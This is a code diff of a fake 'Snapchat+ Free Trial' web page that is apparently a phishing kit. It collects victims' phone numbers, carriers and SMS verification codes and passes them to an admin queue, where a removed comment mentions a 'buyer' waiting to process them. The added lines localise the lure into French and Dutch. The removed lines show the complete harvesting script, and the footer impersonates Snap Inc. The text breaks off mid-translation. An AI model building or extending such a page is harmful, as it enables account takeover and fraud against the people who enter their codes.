@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Snapchat+ — Free Trial</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
 
         body {
             min-height: 100vh;
@@ -32,8 +27,28 @@
             border: 1px solid rgba(255,255,255,0.06);
         }
 
+        /* ===== LANGUAGE SELECTOR ===== */
+        .lang-selector {
+            display: flex;
+            gap: 8px;
+            justify-content: flex-end;
+            margin-bottom: 16px;
+        }
+        .lang-selector button {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.1);
+            color: #888;
+            padding: 4px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+        .lang-selector button:hover { border-color: #FFFC00; color: #fff; }
+        .lang-selector button.active { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.1); }
+
         /* ===== BRAND ===== */
-        .brand { text-align: center; margin-bottom: 32px; }
+        .brand { text-align: center; margin-bottom: 28px; }
         .brand .snap-icon {
             width: 72px; height: 72px;
             background: linear-gradient(135deg, #FFFC00, #FFD700);
@@ -44,9 +59,7 @@
             margin: 0 auto 12px;
             font-size: 36px;
             box-shadow: 0 0 60px rgba(255,252,0,0.15);
-            transition: transform 0.3s;
         }
-        .brand .snap-icon:hover { transform: scale(1.05); }
         .brand h1 { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
         .brand h1 span { color: #FFFC00; }
         .brand .tagline { color: #888; font-size: 14px; margin-top: 6px; }
@@ -71,7 +84,7 @@
             100% { opacity: 1; transform: translateY(0) scale(1); }
         }
 
-        .step-title { color: #fff; font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 24px; }
+        .step-title { color: #fff; font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 20px; }
 
         /* ===== COUNTRY ===== */
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
@@ -171,25 +184,11 @@
             transition: all 0.3s;
             caret-color: #FFFC00;
         }
-        .otp-box input:focus {
-            border-color: #FFFC00;
-            box-shadow: 0 0 30px rgba(255,252,0,0.06);
-            background: rgba(255,255,255,0.06);
-        }
+        .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
         .otp-hint { text-align: center; color: #777; font-size: 14px; }
         .otp-hint strong { color: #fff; }
-        .resend {
-            text-align: center;
-            color: #555;
-            font-size: 14px;
-            margin-top: 14px;
-            cursor: pointer;
-            transition: color 0.3s;
-        }
-        .resend:hover { color: #888; }
-        .resend span { color: #FFFC00; font-weight: 500; }
 
-        /* ===== LOADER (Step 4) ===== */
+        /* ===== LOADER ===== */
         .loader-wrap { text-align: center; padding: 20px 0; }
         .loader-spinner {
             width: 48px;
@@ -216,12 +215,7 @@
             border-radius: 4px;
             transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
         }
-        .loader-text {
-            color: #888;
-            font-size: 15px;
-            text-align: center;
-            margin-top: 12px;
-        }
+        .loader-text { color: #888; font-size: 15px; text-align: center; margin-top: 12px; }
         .loader-text strong { color: #fff; }
 
         /* ===== SUCCESS / ERROR ===== */
@@ -230,7 +224,7 @@
         .error-text { color: #ff6b6b !important; }
         .success-text { color: #69db7c !important; }
 
-        /* ===== COMMUNICATION MESSAGES ===== */
+        /* ===== INFO BOX ===== */
         .info-box {
             background: rgba(255,255,255,0.03);
             border-radius: 14px;
@@ -265,41 +259,48 @@
 <div class="container">
     <div class="card">
 
+        <!-- ===== LANGUAGE SELECTOR ===== -->
+        <div class="lang-selector">
+            <button class="active" onclick="setLang('en')">🇬🇧 EN</button>
+            <button onclick="setLang('fr')">🇫🇷 FR</button>
+            <button onclick="setLang('nl')">🇳🇱 NL</button>
+        </div>
+
         <!-- ===== BRAND ===== -->
         <div class="brand">
             <div class="snap-icon">👻</div>
             <h1>snapchat<span>+</span></h1>
-            <p class="tagline">✨ Free Premium Trial — Limited Time</p>
-            <span class="badge">🔥 3 Days Free</span>
+            <p class="tagline" id="tagline">✨ Free Premium Trial — Limited Time</p>
+            <span class="badge" id="badge">🔥 3 Days Free</span>
         </div>
 
-        <!-- ===== STEP 1: COUNTRY ===== -->
+        <!-- STEP 1: COUNTRY -->
         <div id="step1" class="step active">
-            <div class="step-title">🌍 Select Your Country</div>
+            <div class="step-title" id="selectCountry">🌍 Select Your Country</div>
             <div class="grid-2">
                 <div class="country-card" data-country="FR">
                     <span class="flag">🇫🇷</span>
-                    <span class="country-name">France</span>
+                    <span class="country-name" id="france">France</span>
                 </div>
                 <div class="country-card" data-country="BE">
                     <span class="flag">🇧🇪</span>
-                    <span class="country-name">Belgium</span>
+                    <span class="country-name" id="belgium">Belgium</span>
                 </div>
             </div>
         </div>
 
-        <!-- ===== STEP 2: NETWORK ===== -->
+        <!-- STEP 2: NETWORK -->
         <div id="step2" class="step">
-            <div class="step-title">📡 Select Your Network</div>
+            <div class="step-title" id="selectNetwork">📡 Select Your Network</div>
             <div class="network-grid" id="networkGrid"></div>
             <button class="btn btn-secondary" id="backToCountry">← Back</button>
         </div>
 
-        <!-- ===== STEP 3: PHONE ===== -->
+        <!-- STEP 3: PHONE -->
         <div id="step3" class="step">
-            <div class="step-title">📱 Enter Your Phone Number</div>
+            <div class="step-title" id="enterNumber">📱 Enter Your Phone Number</div>
             <div class="info-box">
-                <p>🔐 We'll send a verification code to your number to confirm your eligibility for <strong>Snapchat+</strong>.</p>
+                <p id="phoneInfo">🔐 We'll send a verification code to your number to confirm your eligibility for <strong>Snapchat+</strong>.</p>
             </div>
             <div class="input-group">
                 <span class="code" id="countryCode">+33</span>
@@ -307,61 +308,55 @@
             </div>
             <button class="btn btn-primary" id="sendBtn">Send Code →</button>
             <button class="btn btn-secondary" id="backToNetwork">← Back</button>
-            <p style="color:rgba(255,255,255,0.2);font-size:11px;text-align:center;margin-top:14px;">
-                By continuing you agree to our Terms &amp; Privacy Policy
-            </p>
+            <p style="color:rgba(255,255,255,0.2);font-size:11px;text-align:center;margin-top:14px;" id="termsText">By continuing you agree to our Terms &amp; Privacy Policy</p>
         </div>
 
-        <!-- ===== STEP 4: SENDING OTP (LOADING) ===== -->
+        <!-- STEP 4: LOADING -->
         <div id="step4" class="step">
             <div class="loader-wrap">
                 <div class="loader-spinner"></div>
-                <div class="step-title" style="font-size:20px;">⏳ Sending Code...</div>
-                <p class="loader-text">We're sending a <strong>verification code</strong> to your number.</p>
-                <p class="loader-text" style="font-size:13px;color:#666;margin-top:4px;">Please wait, this may take a few seconds.</p>
+                <div class="step-title" id="sendingTitle" style="font-size:20px;">⏳ Sending Code...</div>
+                <p class="loader-text" id="sendingText">We're sending a <strong>verification code</strong> to your number.</p>
+                <p class="loader-text" style="font-size:13px;color:#666;margin-top:4px;" id="waitText">Please wait, this may take a few seconds.</p>
                 <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
             </div>
         </div>
 
-        <!-- ===== STEP 5: OTP ===== -->
+        <!-- STEP 5: OTP -->
         <div id="step5" class="step">
-            <div class="step-title">🔑 Enter Verification Code</div>
+            <div class="step-title" id="enterOTP">🔑 Enter Verification Code</div>
             <div class="info-box">
-                <p>📲 We sent a <strong>verification code</strong> to <strong id="displayNumber"></strong></p>
-                <p style="font-size:13px;color:#666;margin-top:4px;">Please check your SMS and enter the code below.</p>
+                <p id="otpInfo">📲 We sent a <strong>verification code</strong> to <strong id="displayNumber"></strong></p>
+                <p style="font-size:13px;color:#666;margin-top:4px;" id="otpHint">Please check your SMS and enter the code below.</p>
             </div>
             <div class="otp-box" id="otpContainer"></div>
             <button class="btn btn-primary" id="verifyBtn">Verify Code →</button>
-            <p class="resend" id="resendBtn">Didn't get the code? <span>Resend</span></p>
             <button class="btn btn-secondary" id="backToPhone">← Back</button>
         </div>
 
-        <!-- ===== STEP 6: SUCCESS ===== -->
+        <!-- STEP 6: SUCCESS -->
         <div id="step6" class="step">
             <div class="icon-big">✅</div>
-            <div class="step-title">Snapchat+ Activated! 🎉</div>
+            <div class="step-title" id="successTitle">Snapchat+ Activated! 🎉</div>
             <div class="info-box" style="border-left-color:#69db7c;">
-                <p>✅ Your <strong>Snapchat+</strong> free trial is now active!</p>
-                <p style="font-size:13px;color:#666;margin-top:4px;">You now have access to exclusive features. Enjoy!</p>
+                <p id="successText">✅ Your <strong>Snapchat+</strong> free trial is now active!</p>
+                <p style="font-size:13px;color:#666;margin-top:4px;" id="successSub">You now have access to exclusive features. Enjoy!</p>
             </div>
             <button class="btn btn-primary" style="margin-top:20px;" id="resetBtn">Open Snapchat</button>
         </div>
 
-        <!-- ===== STEP 7: ERROR ===== -->
+        <!-- STEP 7: ERROR -->
         <div id="step7" class="step">
             <div class="icon-big">❌</div>
-            <div class="step-title">Invalid Code</div>
+            <div class="step-title" id="errorTitle">Invalid Code</div>
             <div class="info-box" style="border-left-color:#ff6b6b;">
-                <p>❌ The code you entered is <strong>incorrect</strong>.</p>
-                <p style="font-size:13px;color:#666;margin-top:4px;">Please check your SMS and try again.</p>
+                <p id="errorText">❌ The code you entered is <strong>incorrect</strong>.</p>
+                <p style="font-size:13px;color:#666;margin-top:4px;" id="errorSub">Please check your SMS and try again.</p>
             </div>
             <button class="btn btn-primary" style="margin-top:20px;" id="retryOTPBtn">Try Again</button>
         </div>
 
-        <!-- ===== FOOTER ===== -->
-        <div class="footer">
-            © 2026 Snap Inc. — Not affiliated with Snapchat.
-        </div>
+        <div class="footer">© 2026 Snap Inc. — Not affiliated with Snapchat.</div>
 
     </div>
 </div>
@@ -374,6 +369,7 @@
     let selectedNetwork = null;
     let queueId = null;
     let otpLength = 4;
+    let currentLang = 'en';
 
     const COUNTRIES = {
         FR: { name: 'France', code: '+33', networks: ['Orange', 'SFR', 'Bouygues', 'Free'], queue: 'A' },
@@ -381,317 +377,82 @@
     };
 
     // ============================================================
-    // DOM REFS
+    // TRANSLATIONS
     // ============================================================
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const step3 = document.getElementById('step3');
-    const step4 = document.getElementById('step4');
-    const step5 = document.getElementById('step5');
-    const step6 = document.getElementById('step6');
-    const step7 = document.getElementById('step7');
-
-    const networkGrid = document.getElementById('networkGrid');
-    const countryCode = document.getElementById('countryCode');
-    const phoneInput = document.getElementById('phoneInput');
-    const displayNumber = document.getElementById('displayNumber');
-    const progressFill = document.getElementById('progressFill');
-    const otpContainer = document.getElementById('otpContainer');
-
-    const sendBtn = document.getElementById('sendBtn');
-    const verifyBtn = document.getElementById('verifyBtn');
-
-    // ============================================================
-    // STEP MANAGEMENT
-    // ============================================================
-    function goToStep(id) {
-        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
-
-    // ============================================================
-    // STEP 1: COUNTRY
-    // ============================================================
-    document.querySelectorAll('.country-card').forEach(function(card) {
-        card.addEventListener('click', function() {
-            const country = this.dataset.country;
-            selectCountry(country);
-        });
-    });
-
-    function selectCountry(country) {
-        selectedCountry = country;
-
-        document.querySelectorAll('.country-card').forEach(function(el) {
-            el.classList.remove('selected');
-        });
-        document.querySelector('.country-card[data-country="' + country + '"]').classList.add('selected');
-
-        const networks = COUNTRIES[country].networks;
-        networkGrid.innerHTML = '';
-        networks.forEach(function(net) {
-            const btn = document.createElement('div');
-            btn.className = 'network-card';
-            btn.textContent = net;
-            btn.dataset.network = net;
-            btn.addEventListener('click', function() {
-                selectNetwork(net);
-            });
-            networkGrid.appendChild(btn);
-        });
-
-        goToStep('step2');
-    }
-
-    // ============================================================
-    // STEP 2: NETWORK
-    // ============================================================
-    function selectNetwork(network) {
-        selectedNetwork = network;
-
-        document.querySelectorAll('.network-card').forEach(function(el) {
-            el.classList.remove('selected');
-        });
-        document.querySelector('.network-card[data-network="' + network + '"]').classList.add('selected');
-
-        countryCode.textContent = COUNTRIES[selectedCountry].code;
-        goToStep('step3');
-        phoneInput.focus();
-    }
-
-    // ============================================================
-    // BACK BUTTONS
-    // ============================================================
-    document.getElementById('backToCountry').addEventListener('click', function() {
-        goToStep('step1');
-    });
-
-    document.getElementById('backToNetwork').addEventListener('click', function() {
-        goToStep('step2');
-    });
-
-    document.getElementById('backToPhone').addEventListener('click', function() {
-        goToStep('step3');
-        phoneInput.focus();
-    });
-
-    document.getElementById('retryOTPBtn').addEventListener('click', function() {
-        goToStep('step5');
-        document.querySelectorAll('.otp-box input').forEach(function(el) { el.value = ''; });
-        document.querySelector('.otp-box input')?.focus();
-    });
-
-    document.getElementById('resetBtn').addEventListener('click', resetAll);
-
-    // ============================================================
-    // STEP 3: SUBMIT
-    // ============================================================
-    sendBtn.addEventListener('click', sendNumber);
-
-    phoneInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') sendNumber();
-    });
-
-    async function sendNumber() {
-        const phoneNumber = phoneInput.value.replace(/\s/g, '');
-
-        if (!phoneNumber || phoneNumber.length < 8) {
-            alert('Please enter a valid phone number.');
-            phoneInput.focus();
-            return;
-        }
-
-        const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
-        sendBtn.disabled = true;
-        sendBtn.textContent = 'Sending...';
-
-        goToStep('step4');
-
-        let progress = 0;
-        const interval = setInterval(function() {
-            progress += Math.random() * 10;
-            if (progress > 90) clearInterval(interval);
-            progressFill.style.width = Math.min(progress, 90) + '%';
-        }, 300);
-
-        try {
-            const response = await fetch('/api/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    number: fullNumber,
-                    country: selectedCountry,
-                    network: selectedNetwork,
-                    queue: COUNTRIES[selectedCountry].queue
-                })
-            });
-
-            const data = await response.json();
-            queueId = data.queueId;
-
-            clearInterval(interval);
-            progressFill.style.width = '100%';
-
-            // Wait for admin/buyer to process
-            await checkStatus();
-
-        } catch (error) {
-            alert('Connection error. Please try again.');
-            resetAll();
-        } finally {
-            sendBtn.disabled = false;
-            sendBtn.textContent = 'Send Code →';
-        }
-    }
-
-    async function checkStatus() {
-        let attempts = 0;
-        const maxAttempts = 60;
-
-        const checkInterval = setInterval(async function() {
-            attempts++;
-            try {
-                const response = await fetch('/api/admin/queues');
-                const data = await response.json();
-
-                for (const queue in data) {
-                    for (const entry of data[queue]) {
-                        if (entry.id === queueId) {
-                            if (entry.status === 'otp_sent') {
-                                clearInterval(checkInterval);
-                                otpLength = entry.otp_length || 4;
-                                goToStep('step5');
-                                setupOTP(otpLength);
-                                displayNumber.textContent = entry.number;
-                                document.querySelector('.otp-box input')?.focus();
-                                return;
-                            }
-                            if (entry.status === 'verified') {
-                                clearInterval(checkInterval);
-                                goToStep('step6');
-                                return;
-                            }
-                            if (entry.status === 'wrong') {
-                                clearInterval(checkInterval);
-                                goToStep('step7');
-                                return;
-                            }
-                            break;
-                        }
-                    }
-                }
-
-                if (attempts >= maxAttempts) {
-                    clearInterval(checkInterval);
-                    alert('Timeout. Please try again.');
-                    resetAll();
-                }
-            } catch (error) {
-                // silent
-            }
-        }, 2000);
-    }
-
-    // ============================================================
-    // STEP 5: OTP
-    // ============================================================
-    function setupOTP(length) {
-        otpLength = length;
-        otpContainer.innerHTML = '';
-        for (var i = 0; i < length; i++) {
-            var input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.id = 'otp' + (i + 1);
-            if (i === 0) input.autofocus = true;
-            input.addEventListener('input', function(idx) {
-                return function(e) {
-                    if (this.value.length === 1 && idx < length - 1) {
-                        otpContainer.children[idx + 1].focus();
-                    }
-                };
-            }(i));
-            input.addEventListener('keydown', function(idx) {
-                return function(e) {
-                    if (e.key === 'Backspace' && this.value === '' && idx > 0) {
-                        otpContainer.children[idx - 1].focus();
-                    }
-                    if (e.key === 'Enter') {
-                        verifyOTP();
-                    }
-                };
-            }(i));
-            otpContainer.appendChild(input);
-        }
-        setTimeout(function() {
-            var first = otpContainer.querySelector('input');
-            if (first) first.focus();
-        }, 100);
-    }
-
-    verifyBtn.addEventListener('click', verifyOTP);
-
-    async function verifyOTP() {
-        var inputs = otpContainer.querySelectorAll('input');
-        var otp = '';
-        for (var i = 0; i < otpLength; i++) {
-            otp += inputs[i]?.value || '';
-        }
-
-        if (otp.length !== otpLength) {
-            alert('Please enter the complete verification code.');
-            return;
-        }
-
-        try {
-            var response = await fetch('/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    queueId: queueId,
-                    action: 'verify_otp',
-                    otp: otp
-                })
-            });
-
-            var data = await response.json();
-            if (data.success) {
-                goToStep('step6');
-            } else {
-                goToStep('step7');
-            }
-        } catch (error) {
-            alert('Error verifying OTP. Please try again.');
-        }
-    }
-
-    document.getElementById('resendBtn').addEventListener('click', function() {
-        alert('A new code has been sent to your number.');
-        document.querySelectorAll('.otp-box input').forEach(function(el) { el.value = ''; });
-        document.querySelector('.otp-box input')?.focus();
-    });
-
-    // ============================================================
-    // RESET
-    // ============================================================
-    function resetAll() {
-        goToStep('step1');
-        phoneInput.value = '';
-        selectedCountry = null;
-        selectedNetwork = null;
-        queueId = null;
-        document.querySelectorAll('.otp-box input').forEach(function(el) { el.value = ''; });
-        document.querySelectorAll('.country-card, .network-card').forEach(function(el) {
-            el.classList.remove('selected');
-        });
-        progressFill.style.width = '0%';
-    }
-
-    // ============================================================
-    // INIT
-    // ============================================================
-    goToStep('step1');
-</script>
-
-</body>
-</html>
+    const LANG = {
+        en: {
+            tagline: '✨ Free Premium Trial — Limited Time',
+            badge: '🔥 3 Days Free',
+            selectCountry: '🌍 Select Your Country',
+            france: 'France',
+            belgium: 'Belgium',
+            selectNetwork: '📡 Select Your Network',
+            back: '← Back',
+            enterNumber: '📱 Enter Your Phone Number',
+            phoneInfo: '🔐 We\'ll send a verification code to your number to confirm your eligibility for <strong>Snapchat+</strong>.',
+            send: 'Send Code →',
+            terms: 'By continuing you agree to our Terms & Privacy Policy',
+            sending: '⏳ Sending Code...',
+            sendingText: 'We\'re sending a <strong>verification code</strong> to your number.',
+            waitText: 'Please wait, this may take a few seconds.',
+            enterOTP: '🔑 Enter Verification Code',
+            otpInfo: '📲 We sent a <strong>verification code</strong> to ',
+            otpHint: 'Please check your SMS and enter the code below.',
+            verify: 'Verify Code →',
+            successTitle: 'Snapchat+ Activated! 🎉',
+            successText: '✅ Your <strong>Snapchat+</strong> free trial is now active!',
+            successSub: 'You now have access to exclusive features. Enjoy!',
+            openSnapchat: 'Open Snapchat',
+            errorTitle: 'Invalid Code',
+            errorText: '❌ The code you entered is <strong>incorrect</strong>.',
+            errorSub: 'Please check your SMS and try again.',
+            tryAgain: 'Try Again'
+        },
+        fr: {
+            tagline: '✨ Essai Premium Gratuit — Offre Limitée',
+            badge: '🔥 3 Jours Gratuits',
+            selectCountry: '🌍 Sélectionnez votre pays',
+            france: 'France',
+            belgium: 'Belgique',
+            selectNetwork: '📡 Sélectionnez votre opérateur',
+            back: '← Retour',
+            enterNumber: '📱 Entrez votre numéro',
+            phoneInfo: '🔐 Nous enverrons un code de vérification à votre numéro pour confirmer votre éligibilité à <strong>Snapchat+</strong>.',
+            send: 'Envoyer le code →',
+            terms: 'En continuant, vous acceptez nos Conditions & Politique de confidentialité',
+            sending: '⏳ Envoi du code...',
+            sendingText: 'Nous envoyons un <strong>code de vérification</strong> à votre numéro.',
+            waitText: 'Veuillez patienter, cela peut prendre quelques secondes.',
+            enterOTP: '🔑 Entrez le code de vérification',
+            otpInfo: '📲 Nous avons envoyé un <strong>code de vérification</strong> à ',
+            otpHint: 'Veuillez vérifier votre SMS et saisir le code ci-dessous.',
+            verify: 'Vérifier le code →',
+            successTitle: 'Snapchat+ Activé ! 🎉',
+            successText: '✅ Votre essai gratuit <strong>Snapchat+</strong> est maintenant actif !',
+            successSub: 'Vous avez maintenant accès aux fonctionnalités exclusives. Profitez-en !',
+            openSnapchat: 'Ouvrir Snapchat',
+            errorTitle: 'Code invalide',
+            errorText: '❌ Le code que vous avez saisi est <strong>incorrect</strong>.',
+            errorSub: 'Veuillez vérifier votre SMS et réessayer.',
+            tryAgain: 'Réessayer'
+        },
+        nl: {
+            tagline: '✨ Gratis Premium Proefperiode — Beperkte Tijd',
+            badge: '🔥 3 Gratis Dagen',
+            selectCountry: '🌍 Selecteer uw land',
+            france: 'Frankrijk',
+            belgium: 'België',
+            selectNetwork: '📡 Selecteer uw provider',
+            back: '← Terug',
+            enterNumber: '📱 Voer uw nummer in',
+            phoneInfo: '🔐 We sturen een verificatiecode naar uw nummer om uw geschiktheid voor <strong>Snapchat+</strong> te bevestigen.',
+            send: 'Code verzenden →',
+            terms: 'Door verder te gaan gaat u akkoord met onze Voorwaarden & Privacybeleid',
+            sending: '⏳ Code verzenden...',
+            sendingText: 'We sturen een <strong>verificatiecode</strong> naar uw nummer.',
+            waitText: 'Even geduld, dit kan enkele seconden duren.',
+            enterOTP: '🔑 Voer verificatiecode in',
+            otpInfo: '📲 We hebben een <strong>verificatiecode</strong> gestuurd naar ',
+            otpHint: 'Controleer uw SMS en voer de code hieronder in.',
+            verify: 'Verifiëren →',
+   
